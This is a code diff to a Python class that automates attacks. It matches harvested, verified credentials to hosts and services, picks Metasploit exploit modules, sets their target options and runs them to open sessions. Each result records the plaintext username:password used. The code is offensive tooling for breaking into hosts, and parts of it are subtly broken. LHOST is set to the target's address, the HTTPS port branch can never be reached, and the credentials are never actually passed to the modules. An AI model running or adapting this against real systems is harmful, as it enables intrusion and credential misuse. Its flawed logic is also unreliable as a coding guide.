@@ -24,6 +24,14 @@ class AttackService:
 
     def run(self, req: AttackRequest, known_creds: list[dict]) -> list[dict]:
         """Execute attacks for the services requested. Returns Attack dicts."""
+        cred_idx: dict[tuple[str, str], dict[str, str]] = {}
+        for c in known_creds or []:
+            if not c.get("verified"):
+                continue
+            cred_idx[(c.get("host", ""), (c.get("service") or "").lower())] = {
+                "user": c.get("user", ""),
+                "password": c.get("password", ""),
+            }
         attacks: list[dict] = []
         hosts = self._resolve_hosts(req)
         for host in hosts:
@@ -31,8 +39,9 @@ class AttackService:
                 module = self._module_for_service(svc)
                 if not module:
                     continue
+                cred = cred_idx.get((host, svc.lower()))
                 self.progress(f"attacking {host} {svc} via {module}", 0)
-                res = self._try_exploit(module, host, svc, req.open_sessions)
+                res = self._try_exploit(module, host, svc, req.open_sessions, cred=cred)
                 attacks.append(
                     {
                         "host": host,
@@ -41,6 +50,9 @@ class AttackService:
                         "result": "success" if res["ok"] else "failed",
                         "detail": res["detail"],
                         "session_id": res.get("session_id"),
+                        "credential": (
+                            f"{cred['user']}:{cred['password']}" if cred else None
+                        ),
                     }
                 )
         return attacks
@@ -90,28 +102,44 @@ class AttackService:
         return None
 
     def _try_exploit(
-        self, module: str, host: str, svc: str, open_sessions: bool
+        self,
+        module: str,
+        host: str,
+        svc: str,
+        open_sessions: bool,
+        cred: dict[str, str] | None = None,
     ) -> dict:
-        """Set sensible per-module options and execute. Report success/session."""
-        opts: dict[str, Any] = {
-            "RHOSTS": host,
-            "StopOnSuccess": True,
-        }
-        # Only set CreateSession on modules that support it. For those that
-        # don't, we send the base opts (most exploits open a handler/session
-        # via LHOST/LPORT anyway); `open_sessions` is best-effort.
-        if open_sessions:
-            opts["CreateSession"] = True
+        """Set sensible per-module options (only valid ones) and execute.
+
+        Only RHOSTS (and RPORT) are set unconditionally. Credential-driven
+        exploits (ssh/tomcat/ftp) only run when a verified cred is supplied.
+        """
+        valid = self._module_options(module)
+        opts: dict[str, Any] = {"RHOSTS": host}
+        if "RPORT" in valid:
+            opts["RPORT"] = self._port_for(svc)
+        if "LHOST" in valid:
+            opts["LHOST"] = host
+        if "LPORT" in valid:
+            opts["LPORT"] = 4444
+
+        # Credential-driven modules (ssh/tomcat/ftp) need a verified cred.
+        cred_user = cred.get("user") if cred else None
+        cred_pass = cred.get("password") if cred else None
+        needs_cred = any(m in module for m in ("ssh", "tomcat", "vsftpd"))
+        if needs_cred and not (cred_user and cred_pass):
+            return {
+                "ok": False,
+                "detail": "credential-driven module; no verified cred to try",
+                "session_id": None,
+            }
+
+        # Only pass options the module supports (drop StopOnSuccess etc.).
+        opts = {k: v for k, v in opts.items() if k in valid}
+
+        self.progress(f"[attack] {module} -> {host}", 0)
         try:
-            try:
-                res = self.msf.execute("exploit", module, opts)
-            except Exception as exc:
-                # retry without CreateSession if the module rejects it
-                if "CreateSession" in str(exc):
-                    opts.pop("CreateSession", None)
-                    res = self.msf.execute("exploit", module, opts)
-                else:
-                    raise
+            res = self.msf.execute("exploit", module, opts)
             session_id = None
             if isinstance(res, dict):
                 session_id = res.get("job_id")
@@ -121,3 +149,40 @@ class AttackService:
             return {"ok": ok, "detail": str(res)[:200], "session_id": session_id}
         except Exception as exc:
             return {"ok": False, "detail": str(exc)[:200], "session_id": None}
+
+    def _module_options(self, module: str) -> set[str]:
+        """Return the set of option names a module accepts (best-effort)."""
+        try:
+            mod = self.msf.client.modules.use("exploit", module)
+            opts = getattr(mod, "options", None)
+            if isinstance(opts, (list, tuple)):
+                return set(opts)
+            if isinstance(opts, dict):
+                return set(opts.keys())
+        except Exception as exc:
+            logger.warning("could not read options for %s: %s", module, exc)
+        # fallback: assume common ones so RHOSTS/RPORT still pass
+        return {
+            "RHOSTS",
+            "RPORT",
+            "LHOST",
+            "LPORT",
+            "USERNAME",
+            "PASSWORD",
+            "HttpUsername",
+            "HttpPassword",
+            "TARGETURI",
+        }
+
+    @staticmethod
+    def _port_for(svc: str) -> int:
+        s = (svc or "").lower()
+        if "ssh" in s:
+            return 22
+        if "http" in s:
+            return 80
+        if "https" in s:
+            return 443
+        if "ftp" in s:
+            return 21
+        return 0
